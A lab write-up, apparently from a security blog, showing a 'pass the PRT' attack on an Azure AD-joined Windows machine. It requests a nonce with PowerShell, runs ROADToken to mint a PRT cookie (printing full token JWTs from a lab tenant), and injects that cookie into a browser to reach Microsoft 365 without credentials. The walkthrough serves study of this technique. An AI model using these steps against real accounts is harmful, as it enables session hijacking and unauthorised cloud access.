---
title: "Pass the PRT with RoadToken"
seoTitle: "RoadToken: Elevate Your PRT Success"
seoDescription: "Learn how to generate and use a Primary Refresh Token (PRT) for SSO with ROADToken in Azure AD-joined devices"
datePublished: Sun Mar 09 2025 12:33:21 GMT+0000 (Coordinated Universal Time)
cuid: cm81m6r8j000109lag0dsd5sd
slug: pass-the-prt-with-roadtoken
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1741435851900/a6e3ebbd-c3d5-4e14-96b3-92efc18fac56.jpeg
tags: azure, cybersecurity-1

---

> A Primary Refresh Token (PRT) is used to provide a single sign-on (SSO) experience for users of Windows 10 and mobile OSes. A PRT enables you to log into a Windows 10 device and then access Azure and Microsoft 365 resources without having to re-authenticate. The Windows 10 device must be Azure-joined or hybrid Azure-joined. Once issued, a PRT is valid for 14 days.

> The PRT is stored in LSASS, and the session key gets re-encrypted with the local device's TPM and then stored alongside the PRT. When you attempt to log into a website using a browser that supports SSO to Azure, the Cloud Authentication Provider will create a PRT cookie for the browser and use that cookie to get tokens from Microsoft Entra ID (Azure AD). Microsoft Entra ID (Azure AD) will validate the PRT cookie, and you will be logged in.

In this lab, we will learn how to generate the PRT using [ROADToken](https://github.com/dirkjanm/ROADtoken) and use that JWT token, aka the cookie, to log in to Microsoft 365 through the Firefox browser.

Let's start by verifying whether the machine is joined to an Active Directory (AD). To do this, we will use the command-line tool `dsregcmd.exe`. This tool is specifically designed to provide information about the device's domain join status. To execute this command, you need to open PowerShell with administrative privileges. Once PowerShell is running as Administrator, type `dsregcmd.exe` into the command line and press Enter. This will return detailed information about the machine's domain status, indicating whether it is AD-joined, Azure AD-joined, or not joined at all. This step is crucial because it determines the next steps in our process of generating the Primary Refresh Token (PRT) and using it for single sign-on (SSO) purposes.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741518163536/51194d8a-41a1-4471-b7eb-436bb2ef71b3.png align="center")

```yaml
./dsregcmd.exe /status
```

```basic
+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+

             AzureAdJoined : YES
          EnterpriseJoined : NO
              DomainJoined : NO
               Device Name : Win10-Client

+----------------------------------------------------------------------+
| Device Details                                                       |
+----------------------------------------------------------------------+

                  DeviceId : 6e4cbe68-588b-499c-8c04-dcfff140a1ca
                Thumbprint : 0BF36D245A124205D42B7FBCA6B6AB65A5B06A3C
 DeviceCertificateValidity : [ 2025-03-09 10:23:00.000 UTC -- 2035-03-09 11:53:00.000 UTC ]
            KeyContainerId : 1c68a06c-38a6-4614-a03d-5b00df256789
               KeyProvider : Microsoft Software Key Storage Provider
              TpmProtected : NO
          DeviceAuthStatus : SUCCESS

+----------------------------------------------------------------------+
| Tenant Details                                                       |
+----------------------------------------------------------------------+

                TenantName : INE Security Labs
                  TenantId : d10f84e2-ba05-45c0-90b7-994f1fafa537
                       Idp : login.windows.net
               AuthCodeUrl : https://login.microsoftonline.com/d10f84e2-ba05-45c0-90b7-994f1fafa537/oauth2/authorize
            AccessTokenUrl : https://login.microsoftonline.com/d10f84e2-ba05-45c0-90b7-994f1fafa537/oauth2/token
                    MdmUrl :
                 MdmTouUrl :
          MdmComplianceUrl :
               SettingsUrl :
            JoinSrvVersion : 2.0
                JoinSrvUrl : https://enterpriseregistration.windows.net/EnrollmentServer/device/
                 JoinSrvId : urn:ms-drs:enterpriseregistration.windows.net
             KeySrvVersion : 1.0
                 KeySrvUrl : https://enterpriseregistration.windows.net/EnrollmentServer/key/
                  KeySrvId : urn:ms-drs:enterpriseregistration.windows.net
        WebAuthNSrvVersion : 1.0
            WebAuthNSrvUrl : https://enterpriseregistration.windows.net/webauthn/d10f84e2-ba05-45c0-90b7-994f1fafa537/
             WebAuthNSrvId : urn:ms-drs:enterpriseregistration.windows.net
    DeviceManagementSrvVer : 1.0
    DeviceManagementSrvUrl : https://enterpriseregistration.windows.net/manage/d10f84e2-ba05-45c0-90b7-994f1fafa537/
     DeviceManagementSrvId : urn:ms-drs:enterpriseregistration.windows.net

+----------------------------------------------------------------------+
| User State                                                           |
+----------------------------------------------------------------------+

                    NgcSet : NO
           WorkplaceJoined : NO
             WamDefaultSet : YES
       WamDefaultAuthority : organizations
              WamDefaultId : https://login.microsoft.com
            WamDefaultGUID : {B16898C6-A148-4967-9171-64D755DA8520} (AzureAd)

+----------------------------------------------------------------------+
| SSO State                                                            |
+----------------------------------------------------------------------+

                AzureAdPrt : YES
      AzureAdPrtUpdateTime : 2025-03-09 11:00:27.000 UTC
      AzureAdPrtExpiryTime : 2025-03-23 11:01:41.000 UTC
       AzureAdPrtAuthority : https://login.microsoftonline.com/d10f84e2-ba05-45c0-90b7-994f1fafa537
             EnterprisePrt : NO
    EnterprisePrtAuthority :
                 OnPremTgt : NO
                  CloudTgt : YES
         KerbTopLevelNames : .windows.net,.windows.net:1433,.windows.net:3342,.azure.net,.azure.net:1433,.azure.net:3342

+----------------------------------------------------------------------+
| Diagnostic Data                                                      |
+----------------------------------------------------------------------+

        AadRecoveryEnabled : NO
    Executing Account Name : AzureAD\INEUser, user_d26zuvzj01@inesecuritylabs.onmicrosoft.com
               KeySignTest : PASSED

        DisplayNameUpdated : YES
          OsVersionUpdated : YES
           HostNameUpdated : YES

      Last HostName Update : NONE

+----------------------------------------------------------------------+
| IE Proxy Config for Current User                                     |
+----------------------------------------------------------------------+

      Auto Detect Settings : YES
    Auto-Configuration URL :
         Proxy Server List :
         Proxy Bypass List :

+----------------------------------------------------------------------+
| WinHttp Default Proxy Config                                         |
+----------------------------------------------------------------------+

               Access Type : DIRECT

+----------------------------------------------------------------------+
| Ngc Prerequisite Check                                               |
+----------------------------------------------------------------------+

            IsDeviceJoined : YES
             IsUserAzureAD : YES
             PolicyEnabled : YES
          PostLogonEnabled : YES
            DeviceEligible : NO
        SessionIsNotRemote : NO
            CertEnrollment : none
              PreReqResult : WillNotProvision

For more information, please visit https://www.microsoft.com/aadjerrors
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741518242128/a147e81d-ad5e-4e05-b257-17423a86f14e.png align="center")

We can see that this is an AzureAD joined machine. Now, let's get the tenant ID. Why? Because the Tenant ID uniquely identifies the Azure AD tenant. Without it, attackers can't target the right organization.

Tenant ID: **d10f84e2-ba05-45c0-90b7-994f1fafa537**

Let's now add this as a variable for easy access.

```apache
$TenantId = "d10f84e2-ba05-45c0-90b7-994f1fafa537"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741518854654/266c2168-7868-46a2-999f-62bc5ca1f885.png align="center")

Now, let's define the Azure AD token endpoint and request parameters.

```apache
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"  
$Params = @{  
    "URI"    = $URL  
    "Method" = "POST"  
}  
$Body = @{  
    "grant_type" = "srv_challenge"  
}
```

* The `/oauth2/token` endpoint is a crucial part of the authentication process, as it is specifically used for issuing tokens. These tokens are essential for accessing resources securely, as they confirm the identity of the user or application making the request.
    
* By setting `grant_type=srv_challenge`, we initiate a specific flow within Azure AD. This flow prompts Azure AD to generate and return a **nonce**. A nonce is a unique, one-time random value that is used to ensure the security of the authentication process. It helps prevent replay attacks by ensuring that each authentication request is unique and cannot be reused by malicious actors.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741519424317/eadde155-6e6b-4f75-9458-e48572816590.png align="center")

Let's send an HTTP request using the "Invoke-RestMethod" cmdlet and save the response in the $Result variable.

```apache
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741519590514/a78f7040-5f73-4f1e-be30-2d484965d49c.png align="center")

Now let’s extract the nonce.

```apache
$Result.Nonce
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741521152118/72483184-5451-444b-9d11-4e622d270ab4.png align="center")

And we got the nonce `AwABEgEAAAADAOz_BQD0_xuX7t9QJsac_BFLOxpL6sQ75uxUlhCwYrR6OrnvuwfdWDXzCqmt3nYJ4pHygvYcD_ubMZ880L9_y_IQOsGTyJEgAA`

Let’s now use ROADToken which abuses this by signing the nonce with stolen credentials or keys to forge a valid PRT.

```apache
 .\ROADToken.exe AwABEgEAAAADAOz_BQD0_xuX7t9QJsac_BFLOxpL6sQ75uxUlhCwYrR6OrnvuwfdWDXzCqmt3nYJ4pHygvYcD_ubMZ880L9_y_IQOsGTyJEgAA
```

```bash
Using nonce -exe supplied on command line
T↕  { "response": [{ "name": "x-ms-RefreshTokenCredential", "data": "eyJhbGciOiJIUzI1NiIsICJrZGZfdmVyIjoyLCAiY3R4IjoiRVVSK0kyb2xTSHZnRFwvb1JONk5WV1c0VHAxXC9vSGZ3YiJ9.eyJyZWZyZXNoX3Rva2VuIjoiMS5BYjBBNG9RUDBRVzZ3RVdRdDVsUEg2LWxONGM3cWpodG9CZElzblY2TVdtSTJUdkxBRXU5QUEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQOGN1YTZlVDJOS29XUzBReGxjdF9jRVVsX3JRUjNPeVVpamJ5RXQ4UFJKdHRxWUtmM2E5RFJKb29OX3dmQUJURUVJQktaaE80azFwX21QdE5vWnRJZ3hqVkVnd0tqMEtXRW9FcmNSdEM4U1ZKUXhqdnVaNXg0QlB3Zk41VTV3anBWQnl3Zk16THc2UEE2UVdKX0VaTGl6dUdSNEpiZF8xdjdlb3J1TGY0ZGlHTkphSXdvbXc2dGlZcTQ3dEZhREwtQUtHMnVTWE1nR0tnc2p0ak5jSTF4LUxfS1pMTUgxdkdkVUljR1UyNk43N0ZycHA1WXhHQk5MUDh6bjdHY3k3bjV5MmV6M3hXUTRod2RVdGdVbmRfQjhZbjltUkdOeU5BWnp3TjFRWUpDQ0RKY2Uxd2NBVng1Tzd0UmNmR2ZLUlUzdHV5QWdJbFNkc0pSRlVBNUk0Y0hPaGFBQ09PWFU5VUt6d1MyMHdyQ0txakZRRGVyX1lpLWNmV2E5cVIxQkhCLXk5RlpYSlJpMjRfT0xrbVpRNE5OV3Q3bmZ5Z0k0dVRLek5NNXNuMmp5RWhpaW5NNzdBOHdESFpTUFdVc1Zua1RiYThFR3A1RG1DekhBWERXVWd6RFA3MUhfNkM3MGJ0Um9reFh4dDlabVMzbXR1LTU0bDhCVmJaSW00cmg1QmZlZVNQQ2ZHM2ZqS0owUFV1OEFHZHRSSEJTRktTZ29mc2pIWVZQYkIzb0dfYlYxTjlGUTYwQnRTSFhjNk5pcGNyX3pIYktSdGM1OVdBQV9tTDVubnVjUjMyNXM3RTdaelpSSWs4VVdpYlo0R3BvWmJGZDBmS3lDM21nV2JWTEJfZjkxeWhmTERVN192czlqeGpJQlhiTFJCY1pGSjYzYXJVWnBYUnFVTUpUOURoSW5uZVpPRF9SUE9tRUt1c1VyLVowM3gwZDFHeFhCbk9BM3hqYXdJcEJZbE9WbUEyanRROXlQb2pzbzg4dkdmSHVjcTA0b0tXVl9HdGxvakRfbGZSQTFxZ0RkT1BLN0lqdzZXVTFvQmFhd1l1dlRmNnpIWDBrMHJYMzY2dXBMUWtUS1JmQmU3SDEyelowUnBwa2hMV285Vkl1a3VIcWd3YmliNmg3STctRFNkS0dxZ3hDRXR1Rmo2ZjFPNDZkQnF3OG1VMF9seWJpRk91VnFMVktxTXh5amE2aWp4aXhjbFRFTiIsICJpc19wcmltYXJ5IjoidHJ1ZSIsICJ3aW5fdmVyIjoiMTAuMC4xOTA0MS4zMzkzIiwgIndpbmRvd3NfYXBpX3ZlcnNpb24iOiIyLjAuMSIsICJ4X2NsaWVudF9wbGF0Zm9ybSI6IndpbmRvd3MiLCAicmVxdWVzdF9ub25jZSI6Ii1leGUifQ.zN4pVItT0qap2m5mFkxg0axbmOut31GkJibuQS6Q7P0", "p3pHeader": "CP=\"CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT\"", "flags": 8256 },{ "name": "x-ms-DeviceCredential", "data": "eyJhbGciOiJSUzI1NiIsICJ0eXAiOiJKV1QiLCAieDVjIjoiTUlJRDhqQ0NBdHFnQXdJQkFnSVFXYVIyN2ZIbUlhNU81VFZ1VThtWkpqQU5CZ2txaGtpRzl3MEJBUXNGQURCNE1YWXdFUVlLQ1pJbWlaUHlMR1FCR1JZRGJtVjBNQlVHQ2dtU0pvbVQ4aXhrQVJrV0IzZHBibVJ2ZDNNd0hRWURWUVFERXhaTlV5MVBjbWRoYm1sNllYUnBiMjR0UVdOalpYTnpNQ3NHQTFVRUN4TWtPREprWW1GallUUXRNMlU0TVMwME5tTmhMVGxqTnpNdE1EazFNR014WldGallUazNNQjRYRFRJMU1ETXdPVEV4TURNME9Wb1hEVE0xTURNd09URXlNek0wT1Zvd0x6RXRNQ3NHQTFVRUF4TWtOREZtWVRobE1HVXROVFkzT0MwME5XTmxMVGhpTWpjdE1USXdOV1kyWm1FM1pqSTFNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQW9xUFYyaDJnVVNOZGRqQVwvZlM0S0xoZmdVMUxNNDErMVJDWUE3M0t5N2pJMm5hSjBEMUxNRzJZdmYwb1hmVUlITUxxUklHRmNSQjhFY3lHQ1hWZ1hxTk5YaE9BXC93WVRCbHBncVpsTFZYbXQxOXBlRjgwM2U1ZVwvMjVLY1k0ZnBmV3c4eDRzbWZjWWxVQnRUcCtFWFlRN3ByY3lpQzJtbXpxblNKQlFEUCtsN2FOOHpZczlQRTNcL2lYclJGbVJjajdEd0xZeXNVVDdQaWtrcHVaZFZFMUI1T0FGR3NPS0d1MnlCQkhpUDJyWnViZSs0MVRjSngzYTNvZTBQVE41RHR0alwvN2VuVnFGYk5mQjFVM29Dd1FGXC84VExxRmRXVjhGUlo1QVA1eEFkazdWYWtjNlJVWDd4bkxaVVhNTUNRQzRsNEZxXC9hVnBnM1NUTzUxaTlHdFVDQ1FJREFRQUJvNEhBTUlHOU1Bd0dBMVVkRXdFQlwvd1FDTUFBd0ZnWURWUjBsQVFIXC9CQXd3Q2dZSUt3WUJCUVVIQXdJd0lnWUxLb1pJaHZjVUFRV0NIQUlFRXdTQkVBNk8ra0Y0VnM1Rml5Y1NCZmI2ZnlVd0lnWUxLb1pJaHZjVUFRV0NIQU1FRXdTQkVLdWR3UkJzaHZKSmo3MlM0UllhdnRJd0lnWUxLb1pJaHZjVUFRV0NIQVVFRXdTQkVPS0VEOUVGdXNCRmtMZVpUeCt2cFRjd0ZBWUxLb1pJaHZjVUFRV0NIQWdFQlFTQkFrNUJNQk1HQ3lxR1NJYjNGQUVGZ2h3SEJBUUVnUUV4TUEwR0NTcUdTSWIzRFFFQkN3VUFBNElCQVFBT1M0Wk80RUc4b1wvY0tsSklRdm5GUGN6M0dvQUdSWFNpUkJkNnVKNXNXZngzVnFpMjkyczY5XC9iUWlydElCZDcxNTJNQWZrQ2MxMklTWWltZ25jNzdEaDcwUE5ZblltTDFGQm8waE9WbXNWNGE3UmFVRlNRTDF6ZTNNTzk1NnJpa2lcL1hUays2a3o5NGo0SVRObEtKSnJwak1BM3krVkFsWElDcEtEYlFHbkJoSjRvb2MzQ2hIbXRLMUlwdHpUeCtLd04wZVlmY2lPcE9nSDZDYXlHN0RGVVZQN3dWMDRLaTRYdmZqdE00NzhySlFWSTJaTnRUeXE2UzRlNUtTWGQzTm1XYkRZa3p6aWhlXC9xUEpXVWZRZkoxNFVaR3lpVVJadTgzcFN6UUlpT3NjOElcL1poM3lKZTh4eEtnVlZ0TDhcL0RWNUpiNVRPTUFMWW9PNWcyVzRkblEifQ.eyJyZXF1ZXN0X25vbmNlIjoiLWV4ZSIsICJpc3MiOiJhYWQ6YnJva2VycGx1Z2luIiwgInRlbmFudF9pZCI6ImQxMGY4NGUyLWJhMDUtNDVjMC05MGI3LTk5NGYxZmFmYTUzNyIsICJncmFudF90eXBlIjoiZGV2aWNlX2F1dGgiLCAid2luX3ZlciI6IjEwLjAuMTkwNDEuMzM5MyIsICJ3aW5kb3dzX2FwaV92ZXJzaW9uIjoiMi4wLjEiLCAieF9jbGllbnRfcGxhdGZvcm0iOiJ3aW5kb3dzIn0.SaW13iI4ghgsUim38Gt4iMpof0Qmse_eYot14rtdPxFNs3OnyPWuE4BU_6VqORMIWooV8mhM4boWcUrSt1TBRa6dYrRng3fmiKcmTwyFqMCHPtPy1aodmPtOqSUGV3ocMnrkxB3bkgqXqMqUsg0B9hrOhZhAN2gTV-p95ZTPFw6RQb96ju-DbeghXup08KiXZSk_LpeKw6dT4ZSy72PHXTCoF_3wBgvUtg-zC82hhXn0Pfg4koL4f5PdmOUOvp7O9m0fi6iIpcJEC8jGaernUhuU3KT9KABlJAO3Nb2NUnd_pQF2xgXd2OS7sMJ7t12tyEHLHolgLm4YOmeRTgqR3A; path=\/; domain=login.microsoftonline.com; secure; httponly", "p3pHeader": "CP=\"CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT\"", "flags": 8256 }] }
0
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741521324067/a5a7003d-17ef-43f5-add4-f0fd67dee389.png align="center")

Let's copy the `x-ms-RefreshTokenCredential` value from the output and use the cookie to authenticate to Microsoft 365 without credentials.

```xml
eyJhbGciOiJIUzI1NiIsICJrZGZfdmVyIjoyLCAiY3R4IjoiRVVSK0kyb2xTSHZnRFwvb1JONk5WV1c0VHAxXC9vSGZ3YiJ9.eyJyZWZyZXNoX3Rva2VuIjoiMS5BYjBBNG9RUDBRVzZ3RVdRdDVsUEg2LWxONGM3cWpodG9CZElzblY2TVdtSTJUdkxBRXU5QUEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQOGN1YTZlVDJOS29XUzBReGxjdF9jRVVsX3JRUjNPeVVpamJ5RXQ4UFJKdHRxWUtmM2E5RFJKb29OX3dmQUJURUVJQktaaE80azFwX21QdE5vWnRJZ3hqVkVnd0tqMEtXRW9FcmNSdEM4U1ZKUXhqdnVaNXg0QlB3Zk41VTV3anBWQnl3Zk16THc2UEE2UVdKX0VaTGl6dUdSNEpiZF8xdjdlb3J1TGY0ZGlHTkphSXdvbXc2dGlZcTQ3dEZhREwtQUtHMnVTWE1nR0tnc2p0ak5jSTF4LUxfS1pMTUgxdkdkVUljR1UyNk43N0ZycHA1WXhHQk5MUDh6bjdHY3k3bjV5MmV6M3hXUTRod2RVdGdVbmRfQjhZbjltUkdOeU5BWnp3TjFRWUpDQ0RKY2Uxd2NBVng1Tzd0UmNmR2ZLUlUzdHV5QWdJbFNkc0pSRlVBNUk0Y0hPaGFBQ09PWFU5VUt6d1MyMHdyQ0txakZRRGVyX1lpLWNmV2E5cVIxQkhCLXk5RlpYSlJpMjRfT0xrbVpRNE5OV3Q3bmZ5Z0k0dVRLek5NNXNuMmp5RWhpaW5NNzdBOHdESFpTUFdVc1Zua1RiYThFR3A1RG1DekhBWERXVWd6RFA3MUhfNkM3MGJ0Um9reFh4dDlabVMzbXR1LTU0bDhCVmJaSW00cmg1QmZlZVNQQ2ZHM2ZqS0owUFV1OEFHZHRSSEJTRktTZ29mc2pIWVZQYkIzb0dfYlYxTjlGUTYwQnRTSFhjNk5pcGNyX3pIYktSdGM1OVdBQV9tTDVubnVjUjMyNXM3RTdaelpSSWs4VVdpYlo0R3BvWmJGZDBmS3lDM21nV2JWTEJfZjkxeWhmTERVN192czlqeGpJQlhiTFJCY1pGSjYzYXJVWnBYUnFVTUpUOURoSW5uZVpPRF9SUE9tRUt1c1VyLVowM3gwZDFHeFhCbk9BM3hqYXdJcEJZbE9WbUEyanRROXlQb2pzbzg4dkdmSHVjcTA0b0tXVl9HdGxvakRfbGZSQTFxZ0RkT1BLN0lqdzZXVTFvQmFhd1l1dlRmNnpIWDBrMHJYMzY2dXBMUWtUS1JmQmU3SDEyelowUnBwa2hMV285Vkl1a3VIcWd3YmliNmg3STctRFNkS0dxZ3hDRXR1Rmo2ZjFPNDZkQnF3OG1VMF9seWJpRk91VnFMVktxTXh5amE2aWp4aXhjbFRFTiIsICJpc19wcmltYXJ5IjoidHJ1ZSIsICJ3aW5fdmVyIjoiMTAuMC4xOTA0MS4zMzkzIiwgIndpbmRvd3NfYXBpX3ZlcnNpb24iOiIyLjAuMSIsICJ4X2NsaWVudF9wbGF0Zm9ybSI6IndpbmRvd3MiLCAicmVxdWVzdF9ub25jZSI6Ii1leGUifQ.zN4pVItT0qap2m5mFkxg0axbmOut31GkJibuQS6Q7P0
```

Let’s first open the portal on a new private window.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741521523478/c1a97ae8-bc64-4e8e-8e4a-e250d35d77cf.png align="center")

Using the cookie editor let’s replace the token now.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741521739401/1e21159c-339d-457c-b811-bc2847be6e2d.png align="center")

Now let’s refresh the page.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1741522491683/bc356145-3d72-453f-ad16-0ab3b65881f3.png align="center")

And we’re logged into the system.